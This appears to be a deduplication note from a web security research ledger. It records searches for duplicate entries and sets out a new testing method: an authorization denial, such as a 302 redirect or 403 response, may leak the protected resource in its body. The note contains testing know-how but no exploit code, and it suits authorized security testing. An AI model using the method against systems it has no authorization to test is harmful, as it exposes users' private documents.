DEDUPE/DELTA: tokens `1085782`, `nidens`, `Copy to File`, `shot record` = 0 hits across the three write targets immediately before append; targeted greps for `(den(y|ial)|forbidden|unauthor).{0,80}(redirect|302|body).{0,80}(carry|leak|attach)` and `(redirect|302|error response).{0,60}(carry|leak).{0,60}(resource|document|PDF)` = 0 hits. Related-but-distinct REVIEWED and NOT conflated: §3.1 (swap the ID and compare reads — the IDOR class itself is owned; the DELTA is WHERE the leak hides); ledger ~5659 "DISPLAY-SUPPRESSION != AUTHORIZATION" (a UI hiding a field while a read surfaces it — a cousin rule about field visibility on 200 responses, not a denial response carrying the resource); batch-300 (3) (privacy toggle vs GraphQL read); the Tomcat CVE-2024-21733 error-response leak (request-smuggling desync — ANOTHER request's data in the error body, different defect). DELTA here: the AUTHORIZATION DENIAL ITSELF (post-generation 302/403) is the disclosure surface — the false negative "it redirects/403s, so it's protected" is defeated by reading 3xx/4xx bodies. New general method -> §17.766.
